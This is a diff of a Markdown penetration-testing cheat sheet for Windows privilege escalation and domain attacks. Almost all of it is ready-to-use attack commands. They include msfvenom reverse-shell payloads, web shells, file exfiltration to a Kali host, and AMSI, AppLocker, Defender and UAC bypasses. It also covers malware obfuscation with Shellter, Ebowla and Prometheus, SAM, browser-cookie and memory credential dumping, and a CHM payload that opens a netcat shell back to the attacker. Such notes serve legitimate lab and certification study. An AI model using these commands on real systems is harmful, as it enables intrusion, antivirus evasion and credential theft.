@@ -2,11 +2,11 @@
 *   Shells & Payloads
     *   Metasploit 
         *   `msfconsole` → `search [COMPONENT]` → `use [EXPLOIT]` → `options`
-        *   `set payload windows/[EMPTY/X64]/shell/[BIND/REVERSE]_tcp`
+        *   `set payload windows/[EMPTY/X64]/shell/[BIND/REVERSE]_tcp` → Also `/meterpreter/` instead of `/shell/`
         *   `set payload windows/[EMPTY/X64]/shell_[BIND/REVERSE]_tcp`
     *   Web Shells
         *   `ls -la /usr/share/webshells` + [Public Repository](https://github.com/nicholasaleks/webshells)
-        *   ASP / ASPX / PHP / PL / RB / CFM / JSP / WAR (Tomcat)
+        *   ASP / ASPX / PHP / PL / RB / CFM / JSP / [WAR (Tomcat Manager Endpoints)](https://0xdf.gitlab.io/2020/11/07/htb-tabby.html)
     *   SMB / WebDAV Execution
         *   `smbserv()`                                                                                  → Open Anonymous Server
         *   `cp /usr/share/windows-binaries/nc[32/64].exe .`      → Place NC in SMB Share
@@ -36,7 +36,6 @@
             *   `metash()`
             *   IIS                    → ASP / ASPX
             *   CMD               → EXE / DLL / MSI / PS1
-            *   Link/Macro   → HTA / VBA / VBS
             *   PHP                → `-p php/meterpreter/reverse_tcp -f raw`
             *   WAR               → `-p java/shell_reverse_tcp -f war`
             *   JSP                  → `-p java/shell_reverse_tcp -f raw`
@@ -46,7 +45,7 @@
             *   `msfvenom -p windows/[x64/empty]/exec CMD="net group [DOMAIN_GROUP] hacker /add" -f [FORMAT]`
             *   Remote Access → Add `hacker` to RDP / WinRM Groups
         *   BOF Shellcode
-            *   `msfvenom -a [x86/x64] -p [SHELL_TYPE] -f [python/c] -b [BAD_CHARS] -e [32_BIT_ENCODER] -i 3 --smallest`
+            *   `msfvenom -a [x86/x64] -p [SHELL_TYPE] -f [python/c] -b [BAD_CHARS] [-e [32_BIT_ENCODER] -i 3] --smallest`
             *   Encoders                → `x86/shikata_ga_nai` / `x86/unicode_m`
             *   Extra Options        → `BufferRegister=EAX` / `Exitfunc=thread`
             *   Default Badchars → `\x00\x0a\x0d`
@@ -74,7 +73,7 @@
     *   FTP
         *   `ftpserv()`
         *   `powershell -c (New-Object Net.WebClient).DownloadFile('ftp://[KALI_IP]:2121/[SRC]', '[DEST]')`
-        *   To Kali → `(New-Object Net.WebClient).UploadFile('ftp://[KALI_IP]:2121/[DEST]', '[SRC]')`
+        *   To Kali → `powershell -c (New-Object Net.WebClient).UploadFile('ftp://[KALI_IP]:2121/[DEST]', '[SRC]')`
     *   B64
         *   `cat [SRC] | base64 -w 0;echo` → `[IO.File]::WriteAllBytes("[DEST]", [Convert]::FromBase64String("[B64_DATA]"));`
         *   To Kali → `[Convert]::ToBase64String((Get-Content -path "[SRC]" -Encoding byte))` → `echo [B64] | base64 -d > [DEST]`   
@@ -89,9 +88,10 @@
             *   [Payloads](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
             *   [One-Liners](https://amsi.fail/)
         *   AppLocker
-            *   `Get-AppLockerPolicy -Effective | select -exp RuleCollections` → Run Scripts from Allowed Folders
-            *   [Bypasses](https://github.com/api0cradle/UltimateAppLockerByPassList) / Try World Writable Folders
-        *   CLanguage
+            *   `Get-AppLockerPolicy -Effective | select -exp RuleCollections` 
+            *   Could Also Block `exe` Files → `"This program is blocked by group policy"`
+            *   [Bypasses](https://github.com/api0cradle/UltimateAppLockerByPassList)                               → Also Try World Writable Folders
+        *   Constrained Language
             *   `$ExecutionContext.SessionState.LanguageMode`
             *   [Bypasses](https://sp00ks-git.github.io/posts/CLM-Bypass/)
         *   Execution Policy
@@ -108,31 +108,49 @@
             *   `powershell Set-MpPreference -DisableIOAVProtection $true`
             *   `powershell Set-MpPreference -DisableRealTimeMonitoring $true`
         *   Malware Obfuscation
-            *   `msfvenom -x whoami.exe -p [WINDOWS_PAYLOAD] LHOST=[NIC] LPORT=4444 -f exe > out.exe`
-            *   `msfvenom -p [WINDOWS_PAYLOAD] LHOST=[NIC] LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -i 3 -f exe > out.exe`
-            *   MalvDev / [Killer](https://github.com/0xHossam/Killer) / [Ebowla](https://0xdf.gitlab.io/2019/02/16/htb-giddy.html) / Shellter
-            *   Prometheus Shell
+            *   MalvDev / [Killer](https://github.com/0xHossam/Killer) → Manual Bypass 
+            *   Embedding
+                *   Binaries → `/usr/share/windows-binaries` → `whoami.exe` / `plink.exe` /`putty.exe`
+                *   `msfvenom -x [WIN_BINARY] -p [PAYLOAD] LHOST=[NIC] LPORT=[PORT] -f exe > out.exe`
+            *   Shellter (32-Bit)
+                *   `msfvenom -p [PAYLOAD] LHOST=[NIC] LPORT=[PORT] -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -i 5 -f raw > shell.bin`
+                *   `sudo shellter` → `A` Mode → `Y` Stealth Mode → `shell.bin` Custom Payload → `N` Reflective DLL
+            *   Prometheus
                 *   [Download](https://github.com/paranoidninja/0xdarkvortex-MalwareDevelopment/blob/master/prometheus.cpp) + Change IP & Port
                 *   32/64-Bit Cross-Compile → `[i686-w64-mingw32-g++ / g++] prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc`
+            *   [Ebowla](https://0xdf.gitlab.io/2019/02/16/htb-giddy.html)
+                *   Clone Repository → Edit `genetic.config` → `output_type = GO` / `payload_type = EXE`
+                *   `python ebowla.py [MALWARE.exe] genetic.config`
+                *   Build → `./build_x[86/64]_go.sh output/[EBOWLA_OUTPUT].go [OUT_OBFUSCATED_MALWARE].exe`
     *   UAC
+        *   Member of "Administrators" → Restricted Privileges / File Access
+        *   “Administrator” User               → To SYSTEM Shell
         *   Enumeration
-            *   Member of "Administrators" + Restricted Privileges / File Access
             *   `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA`
             *   `reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`
         *   Bypasess
-            *   `[environment]::OSVersion.Version` → [UACME](https://github.com/hfiref0x/UACME) + [Checklist](https://academy.hackthebox.com/module/67/section/626)
-            *   Send Reverse Shell                               → Through SYSTEM Process (EOP Exploits)
-            *   GUI Access                                              → CMD “Run as Administrator” → Input Credentials
-            *   EventViewer Method
-                *   [Load Module](https://github.com/CsEnox/EventViewer-UACBypass) → `Import-Module Invoke-EventViewer`
-                *   Exploit               → `Invoke-EventViewer [PATH\TO\MALWARE.exe]`
-            *   PSExec (Local / Remote)
-                *   `PsExec.exe -h -s -i cmd`
-                *   `psexec.py [AUTH_STRING]`
+            *   `[environment]::OSVersion.Version` → [UACME](https://github.com/hfiref0x/UACME)
+            *   FodHelper
+                *   [Download File](https://FodhelperUACBypass.ps1 ) → Windows 10 OS
+                *   PS Session          → `FodhelperUACBypass -program "cmd.exe /c [CMD_COMMAND]"`
+            *   EventViewer
+                *   [Download File](https://github.com/CsEnox/EventViewer-UACBypass) → `Import-Module Invoke-EventViewer`
+                *   PS Session          → `Invoke-EventViewer [PATH\TO\MALWARE.exe]`
+            *   RunAs
+                *   [PS Module](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/management/Invoke-RunAs.ps1) / [Executable](https://github.com/antonioCoco/RunasCs/releases)
+                *   `.\RunasCs.exe [USER] [PASSWORD] cmd -r [KALI_IP]:[PORT]`
+                *   `Invoke-RunAs -username [USER] -password "[PASSWORD]" -Cmd cmd -Remote [KALI_IP]:[PORT] -BypassUac`
+            *   PSExec
+                *   Local       → `PsExec.exe -h -s -i cmd`
+                *   Remote  → `psexec.py [AUTH_STRING]`
+            *   RDP Access 
+                *   CMD/PS → Right-Click → “Run as Administrator”
+                *   Input User Credentials
 *   Domain Escalation
     *   Admin Hunting
         *   `Find-LocalAdminAccess`
         *   Credential Objects
+            *   Check if member of `"Remote Management Users"`
             *   `$pass = ConvertTo-SecureString "[PASS]" -AsPlainText -Force`
             *   `$cred = New-Object -TypeName System.Management.Automation.PSCredential("[USER]", $pass)`
             *   `Invoke-Command -Cred $cred -ScriptBlock{[COMMAND]} -ComputerName [REMOTE_HOSTNAME]`
@@ -141,7 +159,7 @@
             *   `$sess = New-PSSession -ComputerName [REMOTE_HOSTNAME]`
             *   `Enter-PSSession -Session $sess [-Cred $cred]`
             *   File Transfers → `Copy-Item` + From/To Session Variable
-        *   RCE
+        *   SMB RCE
             *   `Invoke-WMIExec`
             *   `Invoke-SMBExec`
     *   Domain Roasting
@@ -178,10 +196,9 @@
     *   Service Accounts < Normal Users < Administrator → Determine EOP Path
     *   Authentication
         *   Local Passwords
-            *   `net user [USERNAME]` → Check if member of `"Remote Management Users"`
-            *   `$pass = ConvertTo-SecureString "[PASS]" -AsPlainText -Force`
-            *   `$cred = New-Object -TypeName System.Management.Automation.PSCredential("[USER]", $pass)`
-            *   `Invoke-Command -Cred $cred -ScriptBlock{[COMMAND]} -Computer localhost`
+            *   `net user [USERNAME]`
+            *   `$creds = New-Object System.Management.Automation.PSCredential('[HOSTNAME\[USER]', $(ConvertTo-SecureString '[PASSWORD' -AsPlainText -Force))`
+            *   `Start-Process -FilePath "C:\Windows\System32\cmd.exe" -ArgumentList "/c [OS_COMMAND]" -Credential $creds`
         *   NT Hashes
             *   `Invoke-Rubeus "asktgt /domain:[DOMAIN] /user:[USER] /rc4:[HASH] /ptt"`
             *   Password Conversion → `iconv -f ASCII -t UTF-16LE <(printf "[PASS]") | openssl dgst -md4`
@@ -221,11 +238,13 @@
             *   `.\hyperv-eop.ps1`   → Change `license.rtf` → Startable SYSTEM Service
             *   `sc stop [SERVICE]` → `takeown /F [SERVICE_EXE]` → Overwrite → `sc start [SERVICE]`
         *   Backup Operators
-            *   `SeBackupPrivilege` → If Missing → UAC Bypass
-            *   `SeBackup` Exploitation
+            *   `SeBackupPrivilege` Exploitation
+            *   Enable Privilege
+                *   `. .\SeBackupPrivilege[Utils+CmdLets].dll`
+                *   `Set-SeBackupPrivilege`
         *   Print Operators
-            *   `SeLoadDriverPrivilege` → If Missing → UAC Bypass
-            *   `SeLoadDriverPrivilege` Exploitation (OS < Win10 - 1803)
+            *   `SeLoadDriverPrivilege` Exploitation
+            *   OS < Win10 - 1803
         *   Server Operators
             *   Full Services Access 
             *   `SeBackupPrivilege`
@@ -267,9 +286,7 @@
                     *   `ipmo psgetsys.ps1; ImpersonateFromParentPid -ppid [PID] -command [CMD] -cmdargs [ARGS]`
                     *   [Method 2](https://github.com/bruno-1337/SeDebugPrivilege-Exploit) / [Method 3](https://github.com/dev-zzo/exploits-nt-privesc/blob/master/SeDebugPrivilege/SeDebugPrivilege.c)
             *   [SeBackup](https://academy.hackthebox.com/module/67/section/601)
-                *   `. .\SeBackupPrivilege[Utils+CmdLets].dll`
-                *   `Set-SeBackupPrivilege`
-                *   Protected File Copy
+                *   Arbitrary File Copy
                     *   `robocopy /B [SRC] [DEST]`
                 *   SAM Dumping
                     *   `reg save hklm\sam c:\windows\temp\sam.sav`
@@ -313,7 +330,7 @@
             *   `$credential = Import-Clixml -Path [FILE.xml]`
             *   `$credential.GetNetworkCredential().[username/password]`
         *   Web Applications
-            *   Web Roots            → `c:\xampp`, `c:\inetpub`, `C:\nginx`, `C:\Program Files (x86)`, `C:\Program Files`
+            *   Web Roots            → `c:\xampp\htdocs`, `c:\inetpub\wwwroot`
             *   Host Mappings    → `default`, `000-default.conf`
             *   Log Files                → `[access/error].log`, `httpd-[access/error].log`, `httpd.conf`
             *   DB Files                 → `*[db/database/settings/config].*`, `*.db`, `.sql*`
@@ -347,7 +364,11 @@
             *   `reg query "HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions"`
             *   `reg query "[HKLM/HKCU]\Software\Microsoft\Windows\CurrentVersion\Internet Settings"`
             *   `reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"`
-        *   Chrome/Firefox Sessions
+        *   TeamViewer 
+            *   `cd C:\Program Files (x86)\TeamViewer` 
+            *   Meterpreter → `post/windows/gather/credentials/teamviewer_passwords`
+            *   [Manual Cracking](https://0xdf.gitlab.io/2020/09/05/htb-remote.html)
+        *   Browser Sessions
             *   `SharpChrome.exe logins /unprotect`
             *   `Invoke-SharpChromium -Command "cookies slack.com"`
             *   `copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .`
@@ -365,30 +386,7 @@
             *   `Invoke-ClipboardLogger`
         *   [Exchange Inboxes](https://github.com/dafthack/MailSniper)
 *   System
-    *   Applications
-        *   Exploit Research / License & Readme / Executable Help & Flags / Network Access
-        *   `wmic product get name,version`
-        *   `dir /a /q "C:\Program Files" "C:\Program Files (x86)"`
-        *   `cd C:\`  → Non-Default Folders
-        *   Application Data Folders
-            *   Sensitive Extensions  → `.conf` / `.xml` / `.cnf` / `.config` / `.ini` / `.txt` / `.log` / Encrypted / Archives / SQLITE
-            *   `C:\Users\[USERNAME]\AppData`
-            *   `C:\ProgramData`
-            *   `C:\ProgramData\Configs\*`
-            *   `C:\Program Files\Windows Powershell\*`
-            *   `%WINDIR%\System32\CCM\logs\*.log`
-        *   CHM Hijacking
-            *   `.chm` Files Exists → Check If `C:\Program Files (x86)\HTML Help Workshop` Installed
-            *   [Out-CHM](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1)           → `Out-CHM -Payload "c:\windows\temp\nc64.exe -e cmd [KALI_IP] [PORT]" -HHCPath "[HTML_HELP_WORKSHOP_PATH]`
-            *   `listen [PORT]`    → Wait Callback
-        *   Custom Binaries
-            *   Reverse Engineering → Basic Enumeration / Ghidra Decompiling
-            *   Local / [Remote](https://gist.github.com/Reodus/153373b38b7b54b3e3034cb14122f18a) BOF → ImmunityDebugger / MSFVenom Shellcoding / Vulnerable Functions
     *   OS
-        *   Environment Variables
-            *   `set` → PATH / Drives / Credentials / Architecture
-            *   DLL Hijacking Folders
-                *   `for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users %username%" && echo. )`
         *   Kernel Exploits
             *   `systeminfo` / `wmic qfe list brief`  → [Missing Hotfixes & KB Patches Checker](https://patchchecker.com) / Windows Server ≤ 2019
             *   Watson / WES-NG                                → Exploit Checker Tools
@@ -419,22 +417,54 @@
         *   SCClient
             *   `C:\Windows\CCM\SCClient.exe`
             *   `Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | % { if ($_.ApplicabilityState -eq "Applicable") { $_.Name } }`
+        *   Environment Variables
+            *   `set` → PATH / Drives / Credentials / Architecture
+            *   DLL Hijacking Folders
+                *   `for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users %username%" && echo. )`
     *   Network
         *   Local Services
-            *   `netstat -ano`             → `ESTABILISHED/LISTEN` On → `127.0.0.1` / `::1` / `[::]` / `[INTRANET_IP]`
-            *   Associated Process  → `tasklist | findstr [NETWORK_SERVICE_PID]` → Check Privilege Context
+            *   `netstat -ano`             → `ESTABILISHED/LISTEN` → `127.0.0.1` / `::1` / `[INTRANET_IP]`
+            *   Associated Process  → `tasklist | findstr [SERVICE_PID]` → Check Privilege / Process String
             *   Configuration Files  → All Services + Permissions
             *   DB Access                   → Data Dump / Blank Password / [UDF Escalation](https://juggernaut-sec.com/mysql-user-defined-functions/)
             *   Local Forwarding
             *   Splunk Forwarder / Erlang Port (25672)
         *   [Dynamic Forwarding](https://notes.dollarboysushil.com/pivoting-and-tunneling/ligolo-ng)
-            *   `ipconfig /all` / `route -n`
+            *   `ipconfig /all` / `route -n` →  Ligolo Tunnel
             *   Local Sweep
                 *   Valid for `/24` → Adjust Accordingly
                 *   `(for /L %a IN (1,1,254) DO ping /n 1 /w 1 [INTRANET_CIDR_BLOCK].%a) | find “Reply”`
         *   Traffic Sniffing
             *   `python net-creds.py -i [NIC]`
             *   TCPDump + PCAP Wireshark Analysis → All Unencrypted Protocols
+    *   Processes
+        *   `tasklist /v /fi "username eq [SYSTEM/USER]"`
+        *   `icacls` → (F/M/W) File/Folder Permissions → [Overwrite Binary / DLL Hijack](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes)
+        *   Process Strings                                                  → Credentials + Info Disclosure
+        *   Electron / Chrome Debugger Hijacking
+        *   Memory Dumping (Admin)
+            *   Unencrypted Services
+            *   Browsers / Password Managers
+            *   `procdump.exe -accepteula -ma [PROC_NAME]`
+    *   Applications
+        *   Exploit Research / License & Readme / Executable Help & Flags / Network Access
+        *   `wmic product get name,version`
+        *   `dir /a /q "C:\Program Files" "C:\Program Files (x86)"`
+        *   `cd C:\`  → Non-Default Folders / `inetpub` / `passcore`
+        *   Application Data Folders
+            *   Sensitive Extensions  → `.conf` / `.xml` / `.cnf` / `.config` / `.ini` / `.txt` / `.log` / Encrypted / Archives / SQLITE
+            *   `C:\Users\[USERNAME]\AppData`
+            *   `C:\ProgramData`
+            *   `C:\ProgramData\Configs\*`
+            *   `C:\Program Files\Windows Powershell\*`
+            *   `%WINDIR%\System32\CCM\logs\*.log`
+        *   CHM Hijacking
+            *   `.chm` Files Exists → Check If `C:\Program Files (x86)\HTML Help Workshop` Installed
+            *   [Out-CHM](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1)           → `Out-CHM -Payload "c:\windows\temp\nc64.exe -e cmd [KALI_IP] [PORT]" -HHCPath "[HTML_HELP_WORKSHOP_PATH]`
+            *   `listen [PORT]`    → Wait Callback
+        *   Custom Binaries
+            *   Reverse Engineering → Basic Enumeration / Ghidra Decompiling
+            *   Local / [Remote](https://gist.github.com/Reodus/153373b38b7b54b3e3034cb14122f18a) BOF → ImmunityDebugger / MSFVenom Shellcoding / Vulnerable Functions
     *   Scheduled Jobs
         *   Scripts
             *   `dir /a /q /s /b *.bat *.ps1`
@@ -486,15 +516,6 @@
                 *   Writable Folder       → `echo %PATH%`
                 *   PowerUP                   → `FindPathDLLHijack`
                 *   EXE/DLL In Folder   → Trigger Service
-    *   Processes
-        *   `tasklist /v /fi "username eq [SYSTEM/USER]"`
-        *   `icacls` → (F/M/W) File/Folder Permissions → [Overwrite Binary / DLL Hijack](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes)
-        *   Command Strings                                            → Credentials + Info Disclosure
-        *   Electron / Chrome Debuggers
-        *   Memory Dumping
-            *   Unencrypted Services
-            *   Browsers / Password Managers
-            *   `procdump.exe -accepteula -ma [PROC_NAME]`
     *   Named Pipes
         *   `accesschk.exe /accepteula -w \\.\pipe\* -v` 
         *   Permissions → `GENERIC_WRITE / FILE_ALL_ACCESS`
